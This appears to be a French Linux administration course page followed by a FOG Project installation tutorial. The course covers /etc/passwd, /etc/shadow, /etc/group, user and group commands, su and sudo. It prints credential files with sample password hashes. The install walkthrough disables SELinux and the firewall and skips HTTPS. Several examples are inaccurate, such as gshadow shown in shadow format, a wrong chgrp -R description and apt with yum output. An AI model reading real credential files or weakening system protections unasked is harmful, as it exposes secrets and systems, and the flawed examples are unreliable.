caract\u00e8re:  </p> <pre><code>root@deb:~# cat /etc/group\nroot:x:0:\ndaemon:x:1:\n[...]\nuser:x:1000:\njmartin:x:1001:\nsdia:x:1002:\nabenabel:x:1101:\ninformatique:x:1500:jmartin,abenabel,sdia\n</code></pre> <p>Analyse de colonnes <code>nomgroupe:passechiffr\u00e9:GID:membres,de,ce,groupe,secondaire</code> </p> <p>En g\u00e9n\u00e9ral, il y a un \"x\" dans la colonne du mot de passe, cela indique que le mot de passe est dans un fichier /etc/gshadow </p> <pre><code>user:x:1000:\njmartin:x:1001:\nsdia:x:1002:\nabenabel:x:1101:\ninformatique:x:1500:jmartin,abenabel,sdia\n</code></pre>"},{"location":"Linux/utilisateurs_groupe/#fichier-etcgshadow","title":"Fichier /etc/gshadow","text":"<p>Ce fichier contient les informations cach\u00e9es sur les groupes s\u00e9par\u00e9s par le caract\u00e8re \":\". Il est rarement utilis\u00e9  </p> <pre><code>root@deb:~# cat /etc/gshadow\nroot:$6$c.n9lt$tmf169GMlTRp/ :18684:0:99999:7:::\ndaemon:*:18001:0:99999:7:::\nbin:*:18001:0:99999:7:::\nsys:*:18001:0:99999:7:::\n[...]\njmartin:$6$X1URi$CDj5CU5G12Ex.:18153:0:99999:7:::\nsdia:$6$X0RisM$JngFdwTEmaOfH.:18592:0:99999:7:::\nabenabel:$6$gjD5IZ$EtlYhsMJngFw:18457:0:99999:7:::\n</code></pre> <p>Analyse de colonnes <code>nomgroupe:passechiffr\u00e9:administrateurs:membres,du,groupe</code> </p> <p>Si le champ du mot de passe contient les caract\u00e8res \"!\" ou \"*\", les utilisateurs ne pourront pas utiliser le mot de passe pour acc\u00e9der au groupe. Si le champ est vide, dans ce cas seul les membres du groupe pourront obtenir les permissions du groupe. Le champ administrateur contient la liste des administrateurs du groupe s\u00e9par\u00e9 par des virgules. Les administrateurs peuvent modifier le mot de passe et les membres du groupe.  </p>"},{"location":"Linux/utilisateurs_groupe/#commandes-de-gestion-des-groupes","title":"Commandes de gestion des groupes","text":""},{"location":"Linux/utilisateurs_groupe/#commande-groupadd","title":"Commande <code>groupadd</code>","text":"<p><code>groupadd &lt;options&gt; [nom du groupe]</code> </p> <p>Option usuelle:  </p> <ul> <li>[-g]: valeur num\u00e9rique de l'identifiant du groupe. Cette valeur doit \u00eatre unique   Par d\u00e9faut, le plus petit identifiant sup\u00e9rieur au GID_MIN et aux identifiants des groupes existants est utilis\u00e9.</li> </ul>"},{"location":"Linux/utilisateurs_groupe/#commande-groumod","title":"Commande <code>groumod</code>","text":"<p><code>groupmod &lt;options&gt; [nom du groupe]</code> </p> <p>Options usuelles:  </p> <ul> <li>[-g [GID]]: change le GID d'un groupe. Attention aux orphelins des fichiers cr\u00e9es pr\u00e9alablement.</li> <li>[-n [nouveau nom]]: change le nom du groupe</li> </ul>"},{"location":"Linux/utilisateurs_groupe/#commande-groupdel","title":"Commande <code>groupdel</code>","text":"<p><code>groupdel &lt;options&gt; [nom du groupe]</code> </p> <p>Commande permettant de supprimer un groupe uniquement s'il est vid\u00e9 de tous ses membres avant.  </p>"},{"location":"Linux/utilisateurs_groupe/#commande-gpasswd","title":"Commande <code>gpasswd</code>","text":"<p><code>gpasswd &lt;options&gt; [nom du groupe]</code> </p> <p>Options usuelles:  </p> <ul> <li>[-a [utilisateur]]: ajoute \"utilisateur\" au groupe.</li> <li>[-d [utilisateur]]: supprime \"utilisateur\" du groupe.</li> </ul>"},{"location":"Linux/utilisateurs_groupe/#exemple-utilisation-commande-groupe","title":"Exemple utilisation commande groupe","text":"Exemple manipulation de groupe Cr\u00e9ation de groupe <pre><code>root@deb11:~# groupadd admin\nroot@deb11:~# groupadd stagiaires\nroot@deb11:~# groupadd documentation\nroot@deb11:~# groupadd vip\n</code></pre>"},{"location":"Linux/utilisateurs_groupe/#commande-chgrp","title":"Commande <code>chgrp</code>","text":"<p><code>chgrp &lt;nom_du_groupe&gt; [fichier/dossier]</code> </p> <p>Options usuelles:  </p> <ul> <li>[-R]: R\u00e9cursif change le groupe des fichiers sans les appliquer</li> <li>[-v]: mode verbeux</li> <li>[-c]: affiche les changements effectu\u00e9s sasn les appliquer</li> <li>[--dereference]: modifie le groupe du fichier cible lui-m\u00eame et non du lien symbolique</li> </ul> <p>Permets de changer le groupe propri\u00e9taire d'un fichier ou dossier.  </p> <p>nom_du_groupe correspond au groupe auquel on veut assigner la propri\u00e9t\u00e9 du fichier/dossier.  </p> <p>Seule le <code>root</code> peut changer le groupe propri\u00e9taire.  </p>"},{"location":"Linux/utilisateurs_groupe/#les-fichiers-lies-a-la-gestion-des-utilisateurs","title":"Les fichiers li\u00e9s \u00e0 la gestion des utilisateurs","text":"<p>Les informations concernant les utilisateurs d'un syst\u00e8me Linux sont contenus dans les fichiers /etc/passwd et /etc/shadow Nous pourrons y prendre des informations, mais nous ne les modifierons jamais directement. La manipulation des utilisateurs devra se faire par les commandes d\u00e9di\u00e9es.  </p>"},{"location":"Linux/utilisateurs_groupe/#fichier-etcpasswd","title":"Fichier /etc/passwd","text":"<p>Ce fichier est compos\u00e9 de plusieurs champs, s\u00e9par\u00e9s par le caract\u00e8re \":\"  </p> <pre><code>root@deb:~# cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x 1 1:daemon:/usr/sbin:/usr/sbin/nologin\n[...]\njmartin:x:1001:1001:Jean Martin -\nLogistique:/home/jmartin:/bin/bash\nsdia:x:1002:1002::/home/sdia:/bin/sh\nabenabel:x:1002:1002:Ashanti Ben\nAbel:/home/abenabel:/bin/bash\n</code></pre> <p><code>nom:motdepassechiffr\u00e9:UID:GID:nom complet:/r\u00e9pertoire/personnel:/shell</code> </p> <p>En g\u00e9n\u00e9ral, il y a un \"x\" dasn la colonne du mot de passe, cela indique que le mot de passe est dans le fichier /etc/shadow Le champ UID indique le num\u00e9ro qui est l'identifiant unique de l'utilisateur Le champ GID d\u00e9termine quel est le groupe principal de l'utilisateur. Le champ nom,complet comporte des informations compl\u00e9mentaires comme le nom complet, le t\u00e9l\u00e9phone, etc. Ces informations peuvent \u00eatre directement indiqu\u00e9es lors de la cr\u00e9ation de l'utilisateur ou via la commande <code>chfn</code>. Le champ r\u00e9pertoire personnel contient le chemin du r\u00e9pertoire d'accueil de l'utilisateur, si celui-ci a \u00e9t\u00e9 cr\u00e9\u00e9. Le champ shell correspond au chemin du binaire correspondant au shell de l'utilisateur. Il est possivle de le modifier avec la commande <code>chfn</code>.  </p>"},{"location":"Linux/utilisateurs_groupe/#fichier-etcshadow","title":"Fichier /etc/shadow","text":"<p>Ce fichier contient les informations cach\u00e9es des utilisateurs s\u00e9par\u00e9es par le caract\u00e8re \":\"  </p> <pre><code>root@deb:~# cat /etc/shadow\nroot:$6$c.n9lt$tmf169GMlTRp/:18684:0:99999:7:::\ndaemon:*:18001:0:99999:7:::\nbin:*:18001:0:99999:7:::\nsys:*:18001:0:99999:7:::\n[...]\njmartin:$6$X1URi$CDj5CU5Gl2Ex.:18153:0:99999:7:::\nsdia:$6$X0RisM$JngFdwTEmaOfH.:18592:0:99999:7:::\nabenabel::$6$gjD5IZ$EtlYhsMJngFw:18457:0:99999:7:::\n</code></pre> <p><code>user:motdepasse:datedernierchangement:agemini:agemax:p\u00e9riodeavertissement:p\u00e9riodeinactivit\u00e9:datefinvalidit\u00e9:champr\u00e9serv\u00e9</code> </p> <ul> <li>User: champ contenant le nom de l'utilisateur  </li> <li>Mot de passe: champ contenant le hash du mot de passe. Cette colonne est compos\u00e9e de 3 champs s\u00e9par\u00e9s par des \"$\"  </li> <li>Premier champ: algorithme de hashage</li> <li>\\(1\\) signifie MD5</li> <li>\\(2a\\) signifie Blowfish</li> <li>\\(2\\) signifie Blowfish (manipulation correcte de caract\u00e8res 8 bits)</li> <li>\\(5\\) signifie SHA-256</li> <li> <p>\\(6\\) signifie SHA-512</p> </li> <li> <p>Deuxi\u00e8me champ: le sel (ou grain de sable). C'est une cha\u00eene de caract\u00e8re al\u00e9atoire qui sera ajout\u00e9e au mot de passe avant de faire son hash.  </p> </li> <li>Troisi\u00e8me champ: le hash du mot de passe + sont sel. Le hash est une cha\u00eene de caract\u00e8re unique g\u00e9n\u00e9r\u00e9 par l'algorithme de hash. Plus l'algorithme est fort plus le hash    est complexe \u00e0 d\u00e9crypter.  </li> </ul> <p>Le fait d'utiliser un sel dans le stockage des mots de passe permet d'augmenter la s\u00e9curit\u00e9 des mots de passe. Le principe du hash est de g\u00e9n\u00e9rer une cha\u00eene de caract\u00e8re unique d'une certaine taille par rapport \u00e0 une chaine de caract\u00e8re donn\u00e9e. Donc si deux utilisateurs ont le m\u00eame mot de passe, par exemple \"Pa$$w0rd\", alors les hash purs seront identiques. L'ajout du sel fait en sorte que les hashs soint diff\u00e9rents, pourtant les utilisateurs ont le m\u00eame mot de passe.  </p> <ul> <li>Date de dernier changement de mot de passe: nombre de jours depuis le 1er Janvier 1970 d\u00e9terminant le dernier changement du mot de passe. une valeur \u00e0 0(z\u00e9ro) force le changement du mot de passe pour l'utilisateur \u00e0 la prochaine connexion. Si ce champ est vide, l'utilisateur ne subit pas les options de vieillissement du mot de passe.</li> <li>\u00c0ge minimum: l'\u00e2ge minimum est la dur\u00e9e en jour que l'utilisateur devra attendre avant de pouvoir changer son mot de passe de nouveau. Un champ vide ou \u00e0 0 signifie qu'il n'y a pas d'\u00e2ge minimum l'utilisateur pourra donc changer son mot de passe quand il le souhaite. Si le caract\u00e8res 1 est rentr\u00e9e celui-ci pourra le changer 1 fois par jour.  </li> </ul>"},{"location":"Linux/utilisateurs_groupe/#commandes-de-gestion-des-utilisateurs","title":"Commandes de gestion des utilisateurs","text":""},{"location":"Linux/utilisateurs_groupe/#commande-useradd","title":"Commande <code>useradd</code>","text":"<p><code>useradd &lt;options&gt; [utilisateur]</code> </p> <p>Options usuelles:  </p> <ul> <li>[-m]: useradd cr\u00e9e le r\u00e9pertoire d'accueil de l'utilisateur.</li> <li>[-d [/chemin/rep/accueil]]: r\u00e9pertoire d'accueil de l'utilisateur. Si non indiqu\u00e9, useradd utilisera le nom de l'utilisateur et la valeur de la variable HOME du fichier /etc/default/useradd.</li> <li>[-u [UID]]: indique l'UID de l'utilisateur. Si non renseign\u00e9, useradd utilisera le plus petit UID disponible.</li> <li>[-g [GID]]: indique le GID du groupe principal de l'utilisateur. Si pas pr\u00e9cis\u00e9 il sera cr\u00e9e un groupe au nom de l'utilisateur.</li> <li>[-G [groupe1,groupe2,groupen]]: indique la liste des groupes secondaires de l'utilisateur s\u00e9par\u00e9s par des \",\".</li> <li>[-s]: indique le shell de l'utilisateur sous la forme du chemin absolu du binaire.</li> <li>[-r]: indique la cr\u00e9ation d'un utilisateur syst\u00e8me.</li> <li>[-c]: Indique le nom complet.</li> </ul> <p>Lors de la cr\u00e9ation d'un utilisateur, si l'option [-m] est pass\u00e9e \u00e0 useradd, alors useradd copiera le contenu du r\u00e9pertoire /etc/skel dans le r\u00e9pertoire d'accueil de l'utilisateur.  </p>"},{"location":"Linux/utilisateurs_groupe/#commande-usermod","title":"Commande <code>usermod</code>","text":"<p><code>usermod &lt;options&gt; [utilisateur]</code> </p> <p>Options usuelles:  </p> <ul> <li>[-d [/home/DIR]]: indique le nouveau r\u00e9pertoire d'accueil de l'utilisateur. Si l'option [-m] est fournie, le contenu du r\u00e9pertoire actuel sera d\u00e9plac\u00e9 dans le nouveau r\u00e9pertoire d'accueil.</li> <li>[-e [DATE FIN VALIDITE]]: date \u00e0 laquelle le compte utilisateur sera d\u00e9sactiv\u00e9. La date est indiqu\u00e9e dans le format AAAA-MM-JJ ou en nombre de jours depuis le 1er Janvier 1970. Un param\u00e8tre DATE_FIN_VALIDITE vide d\u00e9sactivera l'expiration du compte.</li> <li>[-f [DUREE INACTIVITE]]: nombre de jours suivant la fin de validit\u00e9 d'un mot de passe apr\u00e8s lequel le compte est d\u00e9finitivement d\u00e9sactiv\u00e9. Une valeur de 0 d\u00e9sactive le compte d\u00e8s que le mot de passe a d\u00e9pass\u00e9 sa fin de validit\u00e9, et une valeur de -1 d\u00e9sactive cette fonctionnalit\u00e9.</li> <li>[-g [GID]]: nom du nouveau groupe principal de l'utilisateur. Tout fichier du r\u00e9pertoire personnel de l'utilisateur appartenant au groupe principal pr\u00e9c\u00e9dent de l'utilisateur appartiendra \u00e0 ce nouveau groupe.</li> </ul> <p>Le groupe propri\u00e9taire des fichiers en dehors du r\u00e9pertoire personnel de l'utilisateur doit \u00eatre modifi\u00e9 manuellement.  </p> <ul> <li>[-G [groupe1,groupe2,goupen]]: liste des groupes secondaires de l'utilisateur. Si l'utilisateur appartient d\u00e9j\u00e0 \u00e0 des groupes secondaires, il est peut-\u00eatre utile d'ajouter l'option [-a] afin de ne pas perdre ces appartenances. Le groupe propri\u00e9taire des fichiers en dehors du r\u00e9pertoire personnel de l'utilisateur doit \u00eatre modifi\u00e9 manuellement.</li> <li>[-a]: ajouter les groupes suppl\u00e9mentaires \u00e0 l'utilisateur. \u00c0 n'utiliser qu'avec l'option [-G]</li> <li>[-s [shell]]: chemin du nouveau shell de l'utilisateur (peut \u00eatre configur\u00e9 \u00e0 l'aide de commande <code>chsh</code>)</li> <li>[-L]: verrouille le mot de passe de l'utilisateur.   Cette option ajoute un \"!\" devant le hash du mot de passe dans /etc/shadow.   Remarque: pour verrouiller le compte (et pas seulement l'acc\u00e8s par un mot de passe), il est \u00e9galement n\u00e9cessaire de placer DATE_FIN_VALIDITE \u00e0 1.</li> <li>[-U]: d\u00e9verrouille le mot de passe de l'utilisateur</li> </ul>"},{"location":"Linux/utilisateurs_groupe/#commande-userdel","title":"Commande <code>userdel</code>","text":"<p><code>userdel &lt;options&gt; [nom du groupe]</code> </p> <p>Permets de supprimer un utilisateur</p> <p>Option usuelle:  </p> <ul> <li>[-r]: les fichiers pr\u00e9sents dans le r\u00e9pertoire d'accueil de l'utilisateur seront \u00e9galement supprim\u00e9s. Les fichiers de l'utilisateur pr\u00e9sents dans d'autres r\u00e9pertoires ne seront pas supprim\u00e9s.</li> </ul>"},{"location":"Linux/utilisateurs_groupe/#commande-passwd","title":"Commande <code>passwd</code>","text":"<p><code>passwd &lt;options&gt; [utilisateur]</code> </p> <p>En plus de pouvoir changer le mot de passe, si root l'ex\u00e9cute, passwd modifiera suivant les options pass\u00e9es les champs du fichier /etc/shadow.  </p> <p>Options usuelles:  </p> <ul> <li>[-e [utilisateur]]: annuler imm\u00e9diatement la validit\u00e9 du mot de passe d'un utilisateur. Celui-ci sera oblig\u00e9 de changer son mot de passe \u00e0 sa prochaine connexion.</li> <li>[-l [utilisateur]]: verrouille le mot de passe en ajoutant un \"!\" devant le hash du mot de passe dans /etc/shadow.</li> <li>[-u [utilisateur]]: d\u00e9verrouille le mot de passe en supprimant le \"!\" devant le hash du mot de passe dans /etc/shadow.</li> </ul>"},{"location":"Linux/utilisateurs_groupe/#exemple-commande-utilisateur","title":"Exemple commande utilisateur","text":"Exemple de manipulation d'utilisateur Cr\u00e9ation d'un utilisateurCr\u00e9ation d'un utilisateur avec un r\u00e9pertoire personnel modifi\u00e9D\u00e9sactivation d'un compte via <code>usermod</code> <p>Fran\u00e7ois: - shell - r\u00e9pertoire personnel /home/francois - mdp: password (n'expire pas) - Groupe Principal : admin - Groupe Secondaires : stagiaires et documentation <pre><code>root@deb11:~# useradd -m -s /bin/sh -g admin -G stagiaires,documentation francois\nroot@deb11:~# id francois\nuid=1001 (francois) gid=1001 (admin) groupes=1001 (admin),1002 (stagiaire),1003 (documentation)\nroot@deb11:~# passwd francois\nNouveau mot de passe :\n#le mot de passe est tap\u00e9 \u00e0 l'aveugle\nRetapez le nouveau mot de passe :\n#le mot de passe est tap\u00e9 \u00e0 l'aveugle\npasswd: password updated successfully\n</code></pre></p> <p>Fr\u00e9d\u00e9ric: - shell \"bash\" - r\u00e9pertoire personnel /home/fred - mdp: AchAngEr (mdp \u00e0 changer \u00e0 la premi\u00e8re ouverture de session) - Groupes secondaires: stagiaires et documentation <pre><code>root@deb11:~# useradd -d /home/fred -s /bin/bash -G stagiaires,documentation frederic\n# dans la ligne pr\u00e9c\u00e9dente le [-d] permet de sp\u00e9cifier un r\u00e9pertoire personnel sp\u00e9cifique au lieu de /home/frederic\nroot@deb11:~# id frederic\nuid=1002 (frederic) gid=1005 (frederic) groupes=1005 (frederic),1002 (stagiaire),1003 (documentation)\nroot@deb11:~# passwd frederic\nNouveau mot de passe :\nRetapez le nouveau mot de passe :\npasswd updated successfully\nroot@deb11:~# passwd -e frederic\n# le [-e] ici ajoute une expiration au mdp, celui-ci devra le changer \u00e0 la prochaine ouverture de session\npasswd: password expiry information changed\n</code></pre></p> <pre><code>root@deb11:~# usermod -L -e 1 frederic\n# l'option [-L] verrouille le compte et [-e 1] force sa date d'expiration\nroot@deb11:~# su - frederic\nVotre compte a expir\u00e9; veuillez contacter votre administrateur syst\u00e8me.\n</code></pre>"},{"location":"Linux/utilisateurs_groupe/#changement-didentite-et-elevation-de-privileges","title":"Changement d'identit\u00e9 et \u00e9l\u00e9vation de privil\u00e8ges","text":""},{"location":"Linux/utilisateurs_groupe/#commande-su","title":"Commande <code>su</code>","text":"<p><code>su &lt;options&gt; [utilisateur]</code></p> <p>su Permets de changer d'utilisateur ou d'ex\u00e9cuter une commande sous l'identit\u00e9 d'un autre utilisateur. Si la commande est invoqu\u00e9e par un simple utilisateur, il faudra qu'il connaisse le mot de passe de l'autre utilisateur. Permets \u00e9galement de devenir root </p> <p>Options usuelles:  </p> <ul> <li>[-s [shell]]: pr\u00e9ciser le shell \u00e0 utiliser pour l'ouverture de session.</li> <li>[-] ou [-l[utilisateur]]: faire un changement complet d'identit\u00e9 (charge les variables d'environnement de l'utilisateur cible).</li> <li>[-c [cmd]]: ex\u00e9cuter la commande, il est conseill\u00e9 de mettre la commande entre simple quote.</li> </ul>"},{"location":"Linux/utilisateurs_groupe/#commande-sudo","title":"Commande <code>sudo</code>","text":"<p><code>sudo &lt;options&gt; [commande]</code> </p> <p>Permets de d\u00e9l\u00e9guer des t\u00e2ches d'administration \u00e0 certains utilisateurs. Ex. Il sera possible d'accorder les privil\u00e8ges de gestion des utilisateurs \u00e0 un groupe d'utilisateurs.  </p> <p>Afin qu'un utilisateur puisse utiliser la commande sudo, il faut qu'il soit renseign\u00e9 dans le fichier de configuration /etc/sudoers et renseigner les commandes qu'il pourra utiliser.</p> <pre><code>jdoe@deb:~$ sudo apt update\n[sudo ] Mot de passe de jdoe\nR\u00e9ception de http://deb.debian.org/debian\nstretch updates InRelease [91,0 kB\n</code></pre> <p>Il est possible de donner tous les droits root \u00e0 un utilisateur en ajoutant le groupe sudo \u00e0 l'utilisateur. L'utilisation de la commande sudo demande le mot de passe de l'utilisateur et non celui de root. L'elevation de privil\u00e8ge sera gard\u00e9e en m\u00e9moire pour cinq minutes par d\u00e9faut.  </p> <pre><code>jdoe@deb:~# sudo -i\n[sudo] Mot de passe de jdoe\nroot@deb:~#\n</code></pre>"},{"location":"Linux/FogProject/fogproject/","title":"FogProject","text":""},{"location":"Linux/FogProject/fogproject/#tuto-deploiement-fogproject","title":"Tuto d\u00e9ploiement FogProject","text":"<p>Fog Project est un logiciel permettant, via le PXE (Preboot Execution Environment) : - Gestion de parc informatique (inscription des machines du parc) - La capture et le d\u00e9ploiement d'images syst\u00e8me (Microsoft Windows, Linux, MacOS). - Ex\u00e9cution de scripts sur un ensemble de machine  </p>"},{"location":"Linux/FogProject/fogproject/#pre-requis","title":"Pr\u00e9-requis","text":"<ul> <li>Disposer des droits administrateur  </li> <li>Disposer d'une connexion internet configur\u00e9e et activ\u00e9e  </li> <li>Avoir une adresse IP fixe pour le serveur  </li> </ul> <p>Il est fortement recommand\u00e9 d'installer FOG sur un serveur d\u00e9di\u00e9. Le script d'installation est pr\u00e9vu pour un syst\u00e8me fraichement install\u00e9.  </p>"},{"location":"Linux/FogProject/fogproject/#recuperation-de-fog-via-le-depot-github","title":"R\u00e9cup\u00e9ration de FOG via le d\u00e9pot Github","text":"<p>Selon la machine utilis\u00e9 la commande d'installation peut varier. Etant sur une machine <code>Rocky Linux</code> mes commandes seront faite avec <code>yum</code> A vous d'adapter avec la commande de votre Distribution  </p>"},{"location":"Linux/FogProject/fogproject/#1-install-git","title":"1 - Install Git","text":"<p>Avant d'installer la derni\u00e8re version de <code>FOG</code> il est n\u00e9c\u00e9ssaire d'sintaller <code>git</code> afin de cloner le d\u00e9pot sur la machine :  </p> install git<pre><code>[root@fogsrv ~]# apt install git\nDerni\u00e8re v\u00e9rification de l\u2019expiration des m\u00e9tadonn\u00e9es effectu\u00e9e il y a 0:44:44 le jeu. 02 nov. 2023 12:01:37.\nD\u00e9pendances r\u00e9solues.\n=============================================================================================================================================\n Paquet                                Architecture                Version                              D\u00e9p\u00f4t                          Taille\n=============================================================================================================================================\nInstallation:\n git                                   x86_64                      2.39.3-1.el9_2                       appstream                       61 k\nInstallation des d\u00e9pendances:\n git-core-doc                          noarch                      2.39.3-1.el9_2                       appstream                      2.6 M\n perl-Error                            noarch                      1:0.17029-7.el9                      appstream                       41 k\n perl-Git                              noarch                      2.39.3-1.el9_2                       appstream                       37 k\n perl-TermReadKey                      x86_64                      2.38-11.el9                          appstream                       36 k\n perl-lib                              x86_64                      0.65-480.el9                         appstream                       15 k\n\nR\u00e9sum\u00e9 de la transaction\n=============================================================================================================================================\nInstaller  6 Paquets\n\nTaille totale des t\u00e9l\u00e9chargements\u00a0: 2.8 M\nTaille des paquets install\u00e9s\u00a0: 17 M\nVoulez-vous continuer\u00a0? [o/N]\u00a0: o\nT\u00e9l\u00e9chargement des paquets\u00a0:\n(1/6): perl-lib-0.65-480.el9.x86_64.rpm                                                                       77 kB/s |  15 kB     00:00    \n(2/6): perl-Error-0.17029-7.el9.noarch.rpm                                                                   201 kB/s |  41 kB     00:00    \n(3/6): perl-TermReadKey-2.38-11.el9.x86_64.rpm                                                               173 kB/s |  36 kB     00:00    \n(4/6): git-2.39.3-1.el9_2.x86_64.rpm                                                                         804 kB/s |  61 kB     00:00    \n(5/6): perl-Git-2.39.3-1.el9_2.noarch.rpm                                                                    369 kB/s |  37 kB     00:00    \n(6/6): git-core-doc-2.39.3-1.el9_2.noarch.rpm                                                                9.2 MB/s | 2.6 MB     00:00    \n---------------------------------------------------------------------------------------------------------------------------------------------\nTotal                                                                                                        3.8 MB/s | 2.8 MB     00:00     \nTest de la transaction\nLa v\u00e9rification de la transaction a r\u00e9ussi.\nLancement de la transaction de test\nTransaction de test r\u00e9ussie.\nEx\u00e9cution de la transaction\n  Pr\u00e9paration           :                                                                                                                1/1 \n  Installation          : git-core-doc-2.39.3-1.el9_2.noarch                                                                             1/6 \n  Installation          : perl-TermReadKey-2.38-11.el9.x86_64                                                                            2/6 \n  Installation          : perl-lib-0.65-480.el9.x86_64                                                                                   3/6 \n  Installation          : perl-Error-1:0.17029-7.el9.noarch                                                                              4/6 \n  Installation          : git-2.39.3-1.el9_2.x86_64                                                                                      5/6 \n  Installation          : perl-Git-2.39.3-1.el9_2.noarch                                                                                 6/6 \n  Ex\u00e9cution du scriptlet: perl-Git-2.39.3-1.el9_2.noarch                                                                                 6/6 \n  V\u00e9rification de       : perl-Error-1:0.17029-7.el9.noarch                                                                              1/6 \n  V\u00e9rification de       : perl-lib-0.65-480.el9.x86_64                                                                                   2/6 \n  V\u00e9rification de       : perl-TermReadKey-2.38-11.el9.x86_64                                                                            3/6 \n  V\u00e9rification de       : perl-Git-2.39.3-1.el9_2.noarch                                                                                 4/6 \n  V\u00e9rification de       : git-core-doc-2.39.3-1.el9_2.noarch                                                                             5/6 \n  V\u00e9rification de       : git-2.39.3-1.el9_2.x86_64                                                                                      6/6 \n\nInstall\u00e9:\n  git-2.39.3-1.el9_2.x86_64            git-core-doc-2.39.3-1.el9_2.noarch  perl-Error-1:0.17029-7.el9.noarch  perl-Git-2.39.3-1.el9_2.noarch \n  perl-TermReadKey-2.38-11.el9.x86_64  perl-lib-0.65-480.el9.x86_64       \n\nTermin\u00e9\u00a0!\n</code></pre>"},{"location":"Linux/FogProject/fogproject/#2-clonage-repository","title":"2 - Clonage repository","text":"<p>Maintenant nous proc\u00e9dons au clonage du d\u00e9p\u00f4t <code>github</code> :  </p> clonage repository github<pre><code>root@fogsrv:/# cd /opt\ngit clone https://github.com/FOGProject/fogproject.git fog_stable/\nClonage dans 'fog_stable'...\nremote: Enumerating objects: 158144, done.\nremote: Counting objects: 100% (4146/4146), done.\nremote: Compressing objects: 100% (1059/1059), done.\nremote: Total 158144 (delta 3078), reused 3988 (delta 2975), pack-reused 153998\nR\u00e9ception d'objets: 100% (158144/158144), 848.71 Mio | 8.47 Mio/s, fait.\nR\u00e9solution des deltas: 100% (112889/112889), fait.\nroot@fogsrv:/opt# ls\nfog_stable\n</code></pre>"},{"location":"Linux/FogProject/fogproject/#3-lancement-script-dinstallation","title":"3 - Lancement Script d'Installation","text":"<pre><code>root@fogsrv:/opt# ls\nfog_stable\nroot@fogsrv ~# cd fogproject/\nroot@fogsrv fogproject]# ls\n authors.txt   bin   CONTRIBUTING.md   lib   LICENSE   packages   README.md  'Release Notes.MD'   SECURITY.md   SELinux   src   utils\n</code></pre> <p>Il suffit de ce rendre dans le dossier <code>/bin</code> et de lancer le script <code>installfog.sh</code> </p> <p>Lancement Script ./installfog.sh<pre><code>root@fogsrv:/opt# ls\nfog_stable\nroot@fogsrv:/opt# cd fog_stable/\nroot@fogsrv:/opt/fog_stable# ls\n authors.txt   CONTRIBUTING.md   LICENSE    README.md            SECURITY.md   src\n bin           lib               packages   'Release Notes.MD'   SELinux       utils\nroot@fogsrv:/opt/fog_stable/bin# ./installfog.sh\nInstalling LSB_Release as needed\n * Attempting to get release information......................../installfog.sh: ligne 369: lsb_release : commande introuvable\nDone\n\n\n   +------------------------------------------+\n   |     ..#######:.    ..,#,..     .::##::.  |\n   |.:######          .:;####:......;#;..     |\n   |...##...        ...##;,;##::::.##...      |\n   |   ,#          ...##.....##:::##     ..:: |\n   |   ##    .::###,,##.   . ##.::#.:######::.|\n   |...##:::###::....#. ..  .#...#. #...#:::. |\n   |..:####:..    ..##......##::##  ..  #     |\n   |    #  .      ...##:,;##;:::#: ... ##..   |\n   |   .#  .       .:;####;::::.##:::;#:..    |\n   |    #                     ..:;###..       |\n   |                                          |\n   +------------------------------------------+\n   |      Free Computer Imaging Solution      |\n   +------------------------------------------+\n   |  Credits: http://fogproject.org/Credits  |\n   |       http://fogproject.org/Credits      |\n   |       Released under GPL Version 3       |\n   +------------------------------------------+\n\n\n   Version: 1.5.10 Installer/Updater\n\n * SELinux is currently enabled on your system. This is often causing\n * issues and we recommend setting to permissive on FOG Servers as of now.\n * Should the installer set this for you now? (Y/n) Y\n</code></pre> Suite \u00e0 la validation les \u00e9tapes de configuration de l'installation se lance  </p> <p>Installation Fog<pre><code> * The local firewall, currently, seems to be enabled on your system. This can cause\n * issues on FOG Servers if you are not well experienced and know what you are doing.\n * Should the installer try to disable the local firewall for you now? (y/N) y\n * Firewall disabled - proceeding with installation...\n  \n  # La question suivante vous demande la version de votre OS Linux\n  # (Celui-ci est normalement deja choisi)  \n  What version of Linux would you like to run the installation for?\n\n          1) Redhat Based Linux (Redhat, Alma, Rocky, CentOS, Mageia)\n          2) Debian Based Linux (Debian, Ubuntu, Kubuntu, Edubuntu)\n          3) Arch Linux\n \n Choice: [2] \n\n  Starting Redhat based Installation\n\n  # Fog Demande si il s'agit d'une installation de Serveur Classique ou de Stockage  \n  # Dans mon cas il s'agit d'une installation de serveur classique \n  FOG Server installation modes:\n      * Normal Server: (Choice N) \n          This is the typical installation type and\n          will install all FOG components for you on this\n          machine.  Pick this option if you are unsure what to pick.\n\n      * Storage Node: (Choice S)\n          This install mode will only install the software required\n          to make this server act as a node in a storage group\n\n  More information:  \n     http://www.fogproject.org/wiki/index.php?title=InstallationModes\n\n  What type of installation would you like to do? [N/s (Normal/Storage)] N\n\n  We found the following interfaces on your system:\n      * ens160 - 192.168.10.42/24\n  # A ce stade l'installateur demande si vous voulez utiliser la carte r\u00e9seau d\u00e9tect\u00e9e \n  # et si vous voulez ou non changer l'IP associ\u00e9e \u00e0 celle-ci\n  Would you like to change the default network interface from ens160?\n  If you are not sure, select No. [y/N] N\n\n  # Question concernant la passerelle utilis\u00e9 pour le DHCP \n  # et donc l'attribution d'IP pendant le d\u00e9ploiement  \n  # G\u00e9n\u00e9ralement indiquer la passerelle sur lequel votre serveur est raccord\u00e9\n  Would you like to setup a router address for the DHCP server? [Y/n] Y\n  What is the IP address to be used for the router on\n      the DHCP server? [192.168.10.254]\n  \n  # Indiquer l'adresse du serveur DNS de votre DHCP  \n  # (Dans le cas d'un domaine il s'agit du DNS du Domaine)  \n  Would you like DHCP to handle DNS? [Y/n] Y\n  What DNS address should DHCP allow? [192.168.10.20]\n  \n  # A ce stade il s'agit d'activer ou non le service DHCP de FOG  \n  # Si vous poss\u00e9dez un serveur DHCP d\u00e9ja pr\u00e9sent sur votre r\u00e9seau \n  # Il sera n\u00e9cessaire de r\u00e9pondre non\n  Would you like to use the FOG server for DHCP service? [y/N] N\n  \n  # FOG demande si vous voulez installer les packs de langue suppl\u00e9mentaire\n  # (R\u00e9pondre oui pour b\u00e9n\u00e9ficier du Fran\u00e7ais sur l'interface graphique)\n  This version of FOG has internationalization support, would  \n  you like to install the additional language packs? [y/N] y\n  \n  # Il s'agit de rebalancer toutes les connexions au web via HTTPS  \n  # Bien entendu \u00e0 activer ! (dans mon environnement de test et afin de b\u00e9n\u00e9ficier  \n  # d'une installation plus rapide j'ai r\u00e9pondu Non)\n  Using encrypted connections is state of the art on the web and we\n  encourage you to enable this for your FOG server. But using HTTPS\n  has 